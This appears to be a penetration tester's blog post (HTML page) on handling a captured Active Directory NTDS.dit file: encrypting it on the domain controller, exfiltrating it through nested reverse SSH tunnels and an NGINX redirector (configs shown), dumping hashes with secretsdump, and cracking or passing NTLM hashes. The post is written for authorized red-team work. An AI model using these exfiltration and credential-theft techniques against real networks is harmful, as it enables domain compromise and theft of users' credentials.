@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Got the NTDS.dit. Now what? // multiplex3r.github.io</title>
+
+    <meta charset="utf-8">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    
+    
+    
+
+        <meta property="og:title" content="Got the NTDS.dit. Now what?" />
+    <meta property="og:description" content="" />
+    <meta property="og:type" content="website" />
+    <meta property="og:locale" content="en" />
+    <meta property="og:url" content="https://multiplex3r.github.io/posts/got_ntds_dit_now/" />
+    
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+    <link href="https://multiplex3r.github.io/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
+    <link href="https://multiplex3r.github.io/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="https://multiplex3r.github.io/css/style.css">
+    
+
+    <meta name="generator" content="Hugo 0.71.1" />
+</head>
+
+
+<body>
+<div id="container">
+    <header id="header">
+    <div id="header-outer" class="outer">
+        <div id="header-inner" class="inner">
+            <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+            <a id="logo" class="logo-text" href="https://multiplex3r.github.io/">multiplex3r.github.io</a>
+            <nav id="main-nav">
+                
+                <a class="main-nav-link" href="/about/">About me</a>
+                
+                <a class="main-nav-link" href="/tags/">Tags</a>
+                
+            </nav>
+            <nav id="sub-nav">
+                <div id="search-form-wrap">
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+
+    <section id="main" class="outer">
+        <article class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        <header class="article-header">
+            <h1 class="article-title" itemprop="name">Got the NTDS.dit. Now what?</h1>
+        </header>
+        
+        <div class="article-meta">
+            <a href="/posts/got_ntds_dit_now/" class="article-date">
+                <time datetime='2020-05-28T16:28:39.000&#43;10:00' itemprop="datePublished">2020-05-28</time>
+            </a>
+            
+            
+            
+        </div>
+        <div class="article-entry" itemprop="articleBody">
+            <p><img src="/images/vault.jpeg" alt="Vault"></p>
+<p>This post will go into some opsec considerations as it relates to high value files. Opsec related tactics, techniques and procedures vary greatly between hackers, but for what it&rsquo;s worth I like to consider the below when I think about high value files and lateral movement. I like to leave an environment at least as secure as it was when I went in.</p>
+<h2 id="first-things-first-what-is-it">First things first, what is it?</h2>
+<p>Of course, if you&rsquo;re reading this post, you likely already know what an NTDS.DIT is, but if you don&rsquo;t, think of it as a file with the entire Active Directory (AD) domain in it. All the objects in a domain such as users, groups, which object is in which group (group membership) and a bunch of other things hackers are interested in. As part of the offensive team my interest in this file specifically lies in nabbing the NTLM hashes for the users in the domain so that I can attempt to crack them or pass them around for lateral movement.</p>
+<h2 id="secondly-do-you-really-need-it">Secondly, do you really need it?</h2>
+<p>Make no mistake, this file can be quite large and it has a lot of secrets inside. Do you <em>really</em> need <em>everyones</em> hashes? I&rsquo;d say that it&rsquo;s probably more likely that you don&rsquo;t and that you are better off using something like DCSync to grab the specific hashes you need to get into the specific environment you&rsquo;re targeting. But, if you needed to do password analysis en-masse or you are unable to DCSync for whatever reason or it&rsquo;s part of your scope, or Jupiter and the moon have aligned on the third occurrence of March this decade and you&rsquo;re absolutely sure you need to, then off we go.</p>
+<h2 id="how-can-you-grab-it">How can you grab it?</h2>
+<p>This post really isn&rsquo;t about how to get the NTDS.DIT file as that&rsquo;s been covered before. There are many of ways to get the hashes from a Domain Controller (DC) documented all over the internet&hellip; I&rsquo;ve personally used DCSync and NTDSUTIL in large organisations to great effect. You can learn this over <a href="https://lmgtfy.com/?q=how+can+get+ntds.dit&amp;pp=1">here</a>&hellip;</p>
+<h2 id="ok-finally-youve-got-the-file">Ok. Finally, you&rsquo;ve got the file.</h2>
+<p>You&rsquo;ve managed to sling exploits, drop malware, scrape creds out of memory and laterally move your way to having a NTDS.DIT file in front of you. Hopefully by now I&rsquo;ve encouraged you enough to find another means to get what you need to further the attack. If not and that large treasure trove of information is coming out with you one way or another, please do consider the following. Your client will thank you for it.</p>
+<h3 id="encrypt-it">Encrypt it.</h3>
+<p>Encrypt the file. Before you copy it anywhere. You might think &ldquo;Oh but it&rsquo;s not important&rdquo; or &ldquo;it was super easy to grab&rdquo; or&hellip; There are many excuses. Just encrypt it, the value of these files can&rsquo;t be understated.</p>
+<p>For me, this means zipping the file up on the DC and then using a tool like 7zip or WinZip to encrypt it with a strong key. If you <strong>have</strong> to copy the encryption tools to the DC (you almost always will) make sure they are known good files (hashes checked) and that when you copy them you&rsquo;re not using the higher privileged account to reach out to a host or pivot where this account hasn&rsquo;t been used before (remember, you <strong>don&rsquo;t</strong> want to leave DA creds in memory of hosts where it wasn&rsquo;t there already).</p>
+<p>A couple ways I&rsquo;ve got the tools to the DC in the past are copy and pasting via RDP from your lower privileged account to the higher privileged account through the RDP session. Or you could use <code>wmiexec.py</code> from Impacket to <code>put</code> the file on the server. There are a lot of other ways to do this (you copy stuff all the time right?) but just be sure that you&rsquo;re not miss-using the higher privilege account.</p>
+<p>Use a <strong>long strong complex password</strong> for the encryption. Remember, if an advanced threat actor does manage to get this file out from under you, it should require <strong>a lot</strong> of processing power to crack this password. At this point, where talking about groups who&rsquo;re likely able to get the NTDS.DIT themselves. If they wanted to.</p>
+<h3 id="exfil-it">Exfil it.</h3>
+<p>Exfil mechanisms vary from client to client, some have handy dandy file transfer services they use for sharing things with the outside world, others have copy paste via Citrix or allow access to web resources.</p>
+<p>Personally, I like to use a myriad of reverse SSH tunnels from hosts with iptables blocking everything I&rsquo;ve not explicitly allowed to enable a client machine to access a local service to upload the file (over https inside the SSH tunnels). You can find the source code for what I use over here, <a href="https://github.com/multiplex3r/exfil_server">on my GitHub.</a></p>
+<p>It kind of looks like this:
+<img src="/images/topo.jpeg" alt="topo"></p>
+<p>You can nest your SSH tunnels like so:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># .ssh/config</span>
+<span style="color:#75715e"># This sets up a local port forward for you to tunnel SSH to your redirectors</span>
+Host command
+    hostname &lt;ip of cc&gt;
+    ForwardAgent yes
+    User lowpriv
+    Compression yes
+    LocalForward <span style="color:#ae81ff">2221</span> redirector1:22
+    LocalForward <span style="color:#ae81ff">2222</span> redirector2:22
+    LocalForward <span style="color:#ae81ff">2223</span> redirector3:22
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># .ssh/config</span>
+<span style="color:#75715e"># This sets up a local dynamic port forward (socks proxy) to allow you</span> 
+<span style="color:#75715e"># to connect to client network via the redirector</span>
+Host redirector1
+    hostname &lt;ip of r1&gt;
+    Port <span style="color:#ae81ff">2221</span>
+    User lowpriv
+    Compression yes
+    <span style="color:#75715e"># set port 31337 to whatever port you&#39;re running your webserver as</span>
+    RemoteForward <span style="color:#ae81ff">1337</span> localhost:31337
+    DynamicForward <span style="color:#ae81ff">1080</span>
+</code></pre></div><p>Copy this for as many redirectors you have.</p>
+<p>On the redirector side, you&rsquo;ll want to have valid SSL certificates in use. I use NGINX with letsencrypt certs. You can do this by following this awesome <a href="https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-20-04">guide</a> for your distro/vps provider of choice.</p>
+<p>And then you can go ahead and configure your NGINX server with a reverse-proxy to your SSH tunnel like so:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># /etc/nginx/sites-enabled/default</span>
+<span style="color:#75715e"># add this inside the server block</span>
+
+    location / <span style="color:#f92672">{</span>
+        proxy_pass https://127.0.0.1:1337
+        <span style="color:#75715e"># remove this next line if you&#39;re not using SSL (you should be)</span>
+        <span style="color:#75715e"># or you&#39;ve got a real cert (not self-signed)</span>
+        proxy_ssl_verify off;
+    <span style="color:#f92672">}</span>
+</code></pre></div><h3 id="use-it">Use it.</h3>
+<p>Again, lots of ways to extract hashes out of the NTDS file once you&rsquo;ve got it local and have unencrypted / unzipped it. I like impacket&rsquo;s SecretsDump for this. Some walkthroughs over <a href="https://lmgtfy.com/?q=dumping+ntds.dit+with+secretsdump&amp;pp=1">here</a>.</p>
+<p>Then you can of course crack NTLM hashes using things like <a href="https://hashcat.net/hashcat/">hashcat</a> or use the NTLM hashes for pass-the-hash or overpass-the-hash attacks.</p>
+<h3 id="destroy-it">Destroy it.</h3>
+<p>Hopefully you already have drive encryption enabled. On top of this it&rsquo;s worth securely deleting your files with <code>srm</code> (<code>apt get secure-delete</code>) or <code>rm -P &lt;files&gt;</code>. Some may argue this is unnecessary as HDD encryption makes it not so easy to do file recovery from a forensics perspective (depending on the encryption). Still it&rsquo;s something I like to do.</p>
+<h1 id="in-closing">In closing</h1>
+<p>In my opinion it&rsquo;s safe to assume that any threat actor who has put themselves in a position to use a DA account on a Domain Controller is technically capable of dumping the NTDS.DIT file if they wanted to, but how do you make sure that other opportunistic attackers who&rsquo;ve not been able to get to this level of privilege don&rsquo;t steal the file out from under you?</p>
+<p>I&rsquo;d encourage you, dear reader, to consider what account you&rsquo;re using to get the NTDS.DIT. Don&rsquo;t leave Domain Admin (DA) tokens laying about in the memory of hosts that don&rsquo;t already have them there.</p>
+<p>For example: If you remote desktop over to a host with some DA creds, in an environment where those DA credentials are highly restricted and presumably hard to come by, and, <strong>that host didn&rsquo;t already have the DA token there in the first place</strong>, you&rsquo;re effectively lowering the security of the organisation you&rsquo;re working for. Try to leave the place at least the same or more secure than when you went in.</p>
+<p>Be excellent to each other :)</p>
+<p>multi</p>
+<p><img src="/images/open_sesame.jpeg" alt="open"></p>
+        </div>
+
+        
+        
+        <div class="article-toc" >
+            <h3>Contents</h3>
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#first-things-first-what-is-it">First things first, what is it?</a></li>
+    <li><a href="#secondly-do-you-really-need-it">Secondly, do you really need it?</a></li>
+    <li><a href="#how-can-you-grab-it">How can you grab it?</a></li>
+    <li><a href="#ok-finally-youve-got-the-file">Ok. Finally, you&rsquo;ve got the file.</a>
+      <ul>
+        <li><a href="#encrypt-it">Encrypt it.</a></li>
+        <li><a href="#exfil-it">Exfil it.</a></li>
+        <li><a href="#use-it">Use it.</a></li>
+        <li><a href="#destroy-it">Destroy it.</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+        
+        
+
+        
+
+
+        
+    </div>
+    
+<nav id="article-nav">
+    
+    
+    <a href="/about/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">About me&nbsp;<span>&gt;</span></div>
+    </a>
+    
+</nav>
+
+
+</article>
+
+        
+    </section>
+    <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2020 multiplex3r.github.io
+            <br />
+            Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with theme <a href="https://github.com/carsonip/hugo-theme-minos" target="_blank">Minos</a>
+        </div>
+    </div>
+    
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/tomorrow-night.min.css" integrity="sha256-2wL88NKUqvJi/ExflDzkzUumjUM73mcK2gBvBBeLvTk=" crossorigin="anonymous" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    <script>
+        document.getElementById('main-nav-toggle').addEventListener('click', function () {
+            var header = document.getElementById('header');
+            if (header.classList.contains('mobile-on')) {
+                header.classList.remove('mobile-on');
+            } else {
+                header.classList.add('mobile-on');
+            }
+        });
+    </script>
+</footer>
+
+</div>
+</body>
+</html>
